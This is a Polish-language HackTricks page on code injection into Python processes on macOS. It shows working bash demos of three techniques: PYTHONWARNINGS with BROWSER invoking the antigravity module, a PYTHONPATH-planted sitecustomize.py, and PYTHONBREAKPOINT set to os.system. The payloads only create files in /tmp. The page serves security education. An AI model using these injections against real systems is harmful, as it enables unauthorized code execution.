# Wstrzykiwanie do aplikacji Python w systemie macOS

{{#include ../../../banners/hacktricks-training.md}}

## Za pośrednictwem zmiennych środowiskowych `PYTHONWARNINGS` i `BROWSER`

Jeśli atakujący może kontrolować środowisko procesu Python, połączenie `PYTHONWARNINGS` i `BROWSER` może uruchomić wykonywanie poleceń, gdy Python importuje moduł `antigravity` podczas przetwarzania spreparowanej opcji ostrzeżenia. Technika ta opiera się na otwieraniu adresu URL przez `antigravity` za pomocą modułu Python `webbrowser`, który respektuje zmienną środowiskową `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Przez `PYTHONPATH` i `sitecustomize.py`

Podczas normalnego uruchamiania moduł `site` języka Python dodaje ścieżki specyficzne dla środowiska, a następnie próbuje zaimportować moduł o nazwie `sitecustomize`. Umieszczając na początku zmiennej `PYTHONPATH` katalog, do którego atakujący ma możliwość zapisu, atakujący kontrolujący środowisko procesu może sprawić, że Python zaimportuje payload przed docelowym skryptem. Flaga `-S` wyłącza automatyczną inicjalizację modułu `site`, natomiast tryb izolowany (`-I`) ignoruje `PYTHONPATH` i oznacza zastosowanie opcji `-s` oraz `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## Przez `PYTHONBREAKPOINT`

Od Pythona 3.7 (PEP 553) wbudowana funkcja `breakpoint()` importuje i wywołuje wszystko, na co wskazuje `sys.breakpointhook`, a cel ten jest pobierany ze zmiennej środowiskowej **`PYTHONBREAKPOINT`** (`package.module.callable`). Zarówno import nazwanego modułu, jak i wywołanie funkcji wykonywane są przed standardowym pojawieniem się debuggera, więc atakujący kontrolujący środowisko procesu, który dociera do `breakpoint()` (co jest częste w skryptach konserwacyjnych/debugujących, a czasami pozostaje również w ścieżkach produkcyjnych), uzyskuje możliwość wykonania kodu.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
W przeciwieństwie do `PYTHONWARNINGS`/`PYTHONPATH` wymaga to, aby cel rzeczywiście dotarł do wywołania `breakpoint()`, ale działa również wyłącznie poprzez **efekty uboczne importu** nazwanego modułu (wskaż dowolny importowalny moduł — na przykład umieszczony jako pierwszy w `PYTHONPATH` — którego kod najwyższego poziomu wykonuje kod). Ustawienie `PYTHONBREAKPOINT=0` całkowicie wyłącza hook.

## References

- [1] [Hacking with Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook konfiguracji zależnej od witryny](https://docs.python.org/3/library/site.html)
- [3] [Wiersz poleceń i środowisko Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Wbudowany breakpoint() i PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
